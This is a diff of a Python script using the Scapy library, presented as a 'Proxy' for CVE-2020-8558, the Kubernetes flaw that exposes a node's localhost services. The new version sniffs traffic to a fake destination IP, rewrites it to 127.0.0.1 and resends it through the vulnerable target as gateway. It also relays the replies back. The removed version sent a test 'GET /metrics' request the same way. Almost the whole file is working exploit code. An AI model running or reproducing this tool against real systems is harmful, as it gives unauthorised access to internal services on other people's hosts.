@@ -5,41 +5,32 @@ import argparse
 
 from scapy.all import *
 
-def main():
+def mangle(pkt):
+    # Duplicate the packets of interest, but redirected to remote localhost
+    if pkt[IP].dst == args.fakedestination:
+        pkt[IP].dst = "127.0.0.1"
+        pkt[IP].chksum = None
+        pkt[IP][TCP].chksum = None
+        print("mangled out: "+repr(pkt))
+        send(pkt[IP])
+    if pkt[IP].src == "127.0.0.1":
+        pkt[IP].src = args.fakedestination
+        pkt[IP].chksum = None
+        pkt[IP][TCP].chksum = None
+        print("mangled in: "+repr(pkt))
+        send(pkt[IP])
+    return None
 
-    ########################################
-    # Setup
+########################################
+# Setup
 
-    parser = argparse.ArgumentParser(description='Proxy for CVE-2020-8558')
-    parser.add_argument('--localport', type=int, help='Port to receive connections', default="8080" )
-    parser.add_argument('--targetport', type=int, help='Port of the target localhost service', default="8080" )
-    parser.add_argument('target', type=str )
-    args = parser.parse_args()
+parser = argparse.ArgumentParser(description='"Proxy" for CVE-2020-8558')
+parser.add_argument('--fakedestination', type=str, help='An arbitrary, unresponsive IP address. Defaults to 198.51.100.1.', default="198.51.100.1" )
+parser.add_argument('target', type=str , help='Vulnerable host on which to access localhost services.')
+args = parser.parse_args()
 
-    conf.use_pcap = True
-    conf.route.add(host="127.0.0.1",gw=args.target,metric=0)
-    #print(repr(conf.route))
+conf.use_pcap = True
+conf.route.add(host="127.0.0.1",gw=args.target,metric=0)
+print(repr(conf.route))
 
-    server = TCP_client.tcplink(Raw, "127.0.0.1", args.targetport)
-    server.send(b"GET /metrics HTTP/1.0\r\n\r\n")
-    print(repr(server.recv()))
-
-    ########################################
-    # listen
-
-    clisock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    clisock.bind(("127.0.0.1",args.localport))
-    clisock.listen()
-
-    while True:
-        client, clientaddr = clisock.accept()
-        while True:
-            data = client.recv(1500)
-            if not data: break
-            client.send(data)
-        client.close()
-
-
-   
-if __name__ == '__main__':
-    main()
+sniff(prn=mangle, filter="host "+args.fakedestination+" or host 127.0.0.1", store=0)
